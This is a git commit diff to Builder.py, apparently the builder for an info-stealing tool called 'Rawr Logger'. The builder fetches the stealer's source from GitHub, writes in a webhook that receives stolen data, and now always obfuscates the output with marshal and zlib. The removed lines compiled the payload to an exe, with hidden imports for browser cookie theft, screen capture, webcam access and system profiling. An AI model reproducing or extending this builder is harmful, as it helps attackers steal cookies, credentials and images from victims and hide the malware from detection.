5e94879d02cea9e5dbbd5f8584d70105a59d4009
Joseloll <106576578+Joseloll@users.noreply.github.com>
2022-09-17 19:36:50 -0600

    Update Builder.py

--- Builder.py
+++ Builder.py
@@ -29,10 +29,9 @@ code = requests.get("https://raw.githubusercontent.com/Joseloll/Rawr-Logger/main
 with open(f"{name}.py", 'w', encoding='utf8') as f:
     f.write(code.text.replace("Webhooksss", webhook))
 Write.Print("Rawr Logger Was SucessFully Built\n",Colors.white_to_green, interval=0.01)
-prot = Write.Input("Would you like to add protection y/n:",Colors.white_to_green, interval=0.01)
-if prot == 'y':
-    with open(f'{name}.py') as fi:
-        pro = fi.read()
+prot = Write.Input(f"Adding Protection Now To {name} Also Click Enter To Contine",Colors.white_to_green, interval=0.01)
+with open(f'{name}.py') as fi:
+    pro = fi.read()
     mar = marshal.dumps(pro)
     zlb = zlib.compress(mar)
     with open(f"{name}.py", 'w') as f:
@@ -46,22 +45,6 @@ if prot == 'y':
         Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
         time.sleep(3)
         exit()
-    elif compile == "n":
-      Write.Print("Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
-      time.sleep(3)
-      exit()
-
-
-elif prot == 'n':
-    compile = Write.Input("Would You Like To Complie To A Exe y/n:", Colors.green_to_yellow, interval=0.01)
-    if compile == "y":
-      os.system(f'pyinstaller --onefile --hidden-import="requests" --hidden-import="PIL" --hidden-import="os" --hidden-import="pystyle"  --hidden-import="socket" --hidden-import="threading" --hidden-import="PIL.ImageGrab" --hidden-import="browser_cookie3"  --hidden-import="json"  --hidden-import="platform"  --hidden-import="re"  --hidden-import="uuid" --hidden-import="psutil"  --hidden-import="cv2" --hidden-import="psutil" {name}.py')
-      os.remove(f'{name}.spec')
-      Write.Print("Rawr Logger Was SucessFully Complied In Dist Folder\n",Colors.white_to_green, interval=0.01) 
-      time.sleep(2)
-      Write.Print("This Program Will Now Exit In 3 Secs Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
-      time.sleep(3)
-      exit()
     elif compile == "n":
       Write.Print("Thank You For Using Rawr Logger\n",Colors.white_to_green, interval=0.01) 
       time.sleep(3)
